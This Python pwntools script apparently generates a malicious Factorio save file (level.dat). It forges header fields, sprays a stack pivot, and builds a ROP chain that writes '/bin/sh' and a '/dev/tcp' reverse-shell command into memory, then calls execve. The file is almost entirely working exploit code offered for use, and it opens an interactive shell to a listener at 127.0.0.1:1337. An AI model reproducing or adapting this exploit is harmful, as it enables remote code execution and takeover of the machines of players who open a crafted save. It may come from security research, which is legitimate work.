#!/usr/bin/env python3
from pwn import p8, p16, p32, p64
from pwnlib.rop import ROP


# exe = ELF("./game/factorio/bin/x64/factorio")

# context.binary = exe


def main():
    b = p16(1) + p16(1) + p16(61) + p16(0)  # some version
    b += p8(0)  # quality version
    b += p8(0)  # ?
    b += p8(0)  # ?
    b += p8(0)  # ?
    b += p8(1)  # difficulty
    b += p8(0)  # finished
    b += p8(0)  # playerWon
    b += p8(0)  # nextLevel -> string
    b += p8(0)  # canContinue
    b += p8(0)  # finishedButContinuing
    b += p8(0)  # saving replay
    b += p8(1)  # allow non admin debug options
    b += p8(1) + p8(1) + p8(0x3b)  # application version "loadedfrom"
    b += p16(0xe9bf)  # buildVersion
    b += p8(1)  # allowed commands
    b += p8(0)  # no mods, not even base lol
    b += p32(0)  # startup settings crc
    b += p8(3) + p8(0)  # value 3 for result?
    b += p8(0)  # bool false to get into the if
    b += p8(0xff) * 5  # encoding an int (-1)

    slide_target = 0xe000000  # the place we hope to find our return slide at
    mov_rsp_rcx = 0x0000000002043fa4  # 0x0000000002043fa4: mov rsp, rcx; ret;

    stack_pivot = p64(slide_target)
    stack_pivot += p64(slide_target)
    stack_pivot += p64(mov_rsp_rcx)
    stack_pivot += p64(mov_rsp_rcx)
    b += stack_pivot * int(0x200000 / 8)

    rop_chain = ROP([])
    data_section = 0x027920e0
    # --- write target program string to memory
    execution_target = '/bin/sh\0'
    rop_chain.raw(0x000000000040e2d4)  # pop rsi; ret;
    rop_chain.raw(execution_target)  # value for rsi
    rop_chain.raw(0x000000000040e86b)  # pop rax; ret;
    rop_chain.raw(data_section)  # value for rax (.data as write target)
    rop_chain.raw(0x0000000001c73b08)  # mov qword ptr [rax], rsi; ret;
    # --- write target program arguments to memory
    program_arguments_0 = '-c\0'.ljust(8, '\0')
    program_arguments_1 = 'sh -i >& /dev/tcp/127.0.0.1/1337 0>&1'.ljust(48, '\0')
    # -- pointer_0
    rop_chain.raw(0x000000000040e2d4)  # pop rsi; ret;
    rop_chain.raw(data_section + 0x20)  # value for rsi
    rop_chain.raw(0x000000000040e86b)  # pop rax; ret;
    rop_chain.raw(data_section + 0x08)  # value for rax (.data as write target)
    rop_chain.raw(0x0000000001c73b08)  # mov qword ptr [rax], rsi; ret;
    # -- pointer_1
    rop_chain.raw(0x000000000040e2d4)  # pop rsi; ret;
    rop_chain.raw(data_section + 0x28)  # value for rsi
    rop_chain.raw(0x000000000040e86b)  # pop rax; ret;
    rop_chain.raw(data_section + 0x10)  # value for rax (.data as write target)
    rop_chain.raw(0x0000000001c73b08)  # mov qword ptr [rax], rsi; ret;
    # -- null pointer
    rop_chain.raw(0x000000000040e2d4)  # pop rsi; ret;
    rop_chain.raw(0)  # value for rsi
    rop_chain.raw(0x000000000040e86b)  # pop rax; ret;
    rop_chain.raw(data_section + 0x18)  # value for rax (.data as write target)
    rop_chain.raw(0x0000000001c73b08)  # mov qword ptr [rax], rsi; ret;
    # -- argument_0
    rop_chain.raw(0x000000000040e2d4)  # pop rsi; ret;
    rop_chain.raw(program_arguments_0)  # value for rsi
    rop_chain.raw(0x000000000040e86b)  # pop rax; ret;
    rop_chain.raw(data_section + 0x20 + 0x00)  # value for rax (.data as write target)
    rop_chain.raw(0x0000000001c73b08)  # mov qword ptr [rax], rsi; ret;
    # -- argument_1_0
    offset = 0x00
    rop_chain.raw(0x000000000040e2d4)  # pop rsi; ret;
    rop_chain.raw(program_arguments_1[offset:offset + 8])  # value for rsi
    rop_chain.raw(0x000000000040e86b)  # pop rax; ret;
    rop_chain.raw(data_section + 0x28 + offset)  # value for rax (.data as write target)
    rop_chain.raw(0x0000000001c73b08)  # mov qword ptr [rax], rsi; ret;
    # -- argument_1_1
    offset = 0x08
    rop_chain.raw(0x000000000040e2d4)  # pop rsi; ret;
    rop_chain.raw(program_arguments_1[offset:offset + 8])  # value for rsi
    rop_chain.raw(0x000000000040e86b)  # pop rax; ret;
    rop_chain.raw(data_section + 0x28 + offset)  # value for rax (.data as write target)
    rop_chain.raw(0x0000000001c73b08)  # mov qword ptr [rax], rsi; ret;
    # -- argument_1_2
    offset = 0x10
    rop_chain.raw(0x000000000040e2d4)  # pop rsi; ret;
    rop_chain.raw(program_arguments_1[offset:offset + 8])  # value for rsi
    rop_chain.raw(0x000000000040e86b)  # pop rax; ret;
    rop_chain.raw(data_section + 0x28 + offset)  # value for rax (.data as write target)
    rop_chain.raw(0x0000000001c73b08)  # mov qword ptr [rax], rsi; ret;
    # -- argument_1_3
    offset = 0x18
    rop_chain.raw(0x000000000040e2d4)  # pop rsi; ret;
    rop_chain.raw(program_arguments_1[offset:offset + 8])  # value for rsi
    rop_chain.raw(0x000000000040e86b)  # pop rax; ret;
    rop_chain.raw(data_section + 0x28 + offset)  # value for rax (.data as write target)
    rop_chain.raw(0x0000000001c73b08)  # mov qword ptr [rax], rsi; ret;
    # -- argument_1_4
    offset = 0x20
    rop_chain.raw(0x000000000040e2d4)  # pop rsi; ret;
    rop_chain.raw(program_arguments_1[offset:offset + 8])  # value for rsi
    rop_chain.raw(0x000000000040e86b)  # pop rax; ret;
    rop_chain.raw(data_section + 0x28 + offset)  # value for rax (.data as write target)
    rop_chain.raw(0x0000000001c73b08)  # mov qword ptr [rax], rsi; ret;
    # -- argument_1_5
    offset = 0x28
    rop_chain.raw(0x000000000040e2d4)  # pop rsi; ret;
    rop_chain.raw(program_arguments_1[offset:offset + 8])  # value for rsi
    rop_chain.raw(0x000000000040e86b)  # pop rax; ret;
    rop_chain.raw(data_section + 0x28 + offset)  # value for rax (.data as write target)
    rop_chain.raw(0x0000000001c73b08)  # mov qword ptr [rax], rsi; ret;
    # --- syscall
    rop_chain.raw(0x000000000040e86b)  # pop rax; ret;
    rop_chain.raw(59)  # value for rax (syscall number)
    rop_chain.raw(0x000000000040e150)  # pop rdi; ret;
    rop_chain.raw(0x027920e0)  # value for rdi (.data as read target)
    rop_chain.raw(0x000000000040e2d4)  # pop rsi; ret;
    rop_chain.raw(0)  # value for rsi
    rop_chain.raw(0x000000000040e68f)  # pop rdx; ret;
    rop_chain.raw(0)  # value for rdx
    rop_chain.raw(0x000000000042c4d6)  # syscall

    return_slide = p64(0x0000000000bf1f1c)  # ret
    b += return_slide * int(0x4000000 / 8)

    print(rop_chain.dump())
    b += rop_chain.chain()

    b += p8(0) * (4294967334 - len(b))

    open("pwn/level.dat", "wb").write(b)


if __name__ == "__main__":
    main()
